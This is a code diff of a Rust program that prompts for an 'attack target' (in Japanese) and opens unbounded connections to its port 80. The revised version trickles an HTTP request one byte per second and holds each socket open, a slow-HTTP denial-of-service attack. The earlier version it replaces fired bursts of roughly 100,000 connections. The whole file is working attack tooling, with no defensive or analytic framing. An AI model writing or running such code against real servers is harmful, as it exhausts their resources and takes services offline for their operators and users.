@@ -1,76 +1,93 @@
-use std::{intrinsics::transmute, io::Write, sync::Arc, time::Duration};
+#[macro_use]
+extern crate lazy_static;
+extern crate tokio;
 
-use tokio::{io::AsyncWriteExt, sync::Mutex, time::sleep};
+use std::{io::Write, time::Duration};
 
-const HTTP_REQUEST: &str = "GET / HTTP/1.1\r\nConnection: keep-alive\r\n";
+use tokio::{
+    io::{AsyncReadExt, AsyncWriteExt, BufStream},
+    sync::RwLock,
+    time::{sleep, Instant},
+};
+
+struct Session {
+    http_request: Vec<u8>,
+    connect: String,
+    errors: RwLock<u8>,
+}
+
+impl Session {
+    fn new() -> Session {
+        Session {
+            http_request: b"GET / HTTP/1.1\r\nConnection: keep-alive\r\n".to_vec(),
+            connect: String::new(),
+            errors: RwLock::const_new(0),
+        }
+    }
+}
+
+lazy_static! {
+    static ref SESSION: RwLock<Session> = RwLock::const_new(Session::new());
+}
 
 #[tokio::main]
-async fn main() -> ! {
+async fn main() {
     print!("攻撃先: ");
     std::io::stdout().flush().unwrap();
     let mut connect = String::new();
     std::io::stdin().read_line(&mut connect).unwrap();
     let mut connect = connect.trim().to_string();
-    let mut http_request = HTTP_REQUEST.to_string();
-    http_request.push_str("Host: ");
-    http_request.push_str(&connect);
-    http_request.push_str("\r\n\r\n");
-    let http_request = http_request.as_bytes();
-    let http_request = unsafe { transmute::<&[u8], &'static [u8]>(http_request) };
+    let mut session = SESSION.write().await;
+    session.http_request.extend(b"Host: ");
+    session.http_request.extend(connect.as_bytes());
+    session.http_request.extend(b"\r\n\r\n");
     connect.push_str(":80");
-    let connect = unsafe { transmute::<&str, &'static str>(&connect) };
+    session.connect = connect;
+    drop(session);
 
-    let attack = move || async move {
-        tokio::spawn(async move {
-            let (send, mut receive) = tokio::sync::mpsc::channel(1);
-            let send = Arc::new(Mutex::new(send));
-            loop {
-                let mut connect = match tokio::net::TcpStream::connect(connect).await {
-                    Ok(o) => o,
-                    Err(_) => return,
-                };
-                let send2 = Arc::clone(&send);
-
-                let a = tokio::spawn(async move {
-                    match connect.write_all(http_request).await {
-                        Ok(_) => (),
-                        Err(_) => return,
-                    };
-                    let mut a = connect.split();
-                    let _ = tokio::io::copy(
-                        &mut a.0,
-                        &mut match tokio::fs::File::create("/dev/null").await {
-                            Ok(o) => o,
-                            Err(_) => return,
-                        },
-                    )
-                    .await;
-                    let _ = send2.lock().await.send(()).await;
-                });
-
-                let send3 = Arc::clone(&send);
-                let b = tokio::spawn(async move {
-                    sleep(Duration::from_secs(3)).await;
-                    let _ = send3.lock().await.send(()).await;
-                });
-
-                receive.recv().await;
-                a.abort();
-                b.abort();
-            }
-        });
-    };
-
-    for _ in 0..10 {
-        for _ in 0..10000 {
-            attack().await;
+    let session = SESSION.read().await;
+    loop {
+        let errors = session.errors.read().await;
+        if *errors == u8::MAX {
+            break;
         }
-        sleep(Duration::from_secs(12)).await;
+        drop(errors);
+
+        tokio::spawn(attack());
     }
     loop {
-        for _ in 0..1000 {
-            attack().await;
+        sleep(Duration::from_secs(1)).await;
+        tokio::spawn(attack());
+    }
+}
+
+async fn attack() {
+    let session = SESSION.read().await;
+    loop {
+        let mut connect = match tokio::net::TcpStream::connect(&session.connect).await {
+            Ok(o) => BufStream::new(o),
+            Err(_) => {
+                let mut errors = session.errors.write().await;
+                if *errors < u8::MAX {
+                    *errors += 1;
+                }
+                return;
+            }
+        };
+
+        for i in 0..session.http_request.len() {
+            let _ = connect.write_all(&session.http_request[i..i + 1]).await;
+            if connect.flush().await.is_err() {
+                break;
+            };
+            sleep(Duration::from_secs(1)).await;
         }
-        sleep(Duration::from_secs(12)).await
+
+        let mut buffer = [0_u8];
+        loop {
+            if connect.read_exact(&mut buffer).await.is_err() {
+                break;
+            }
+        }
     }
 }
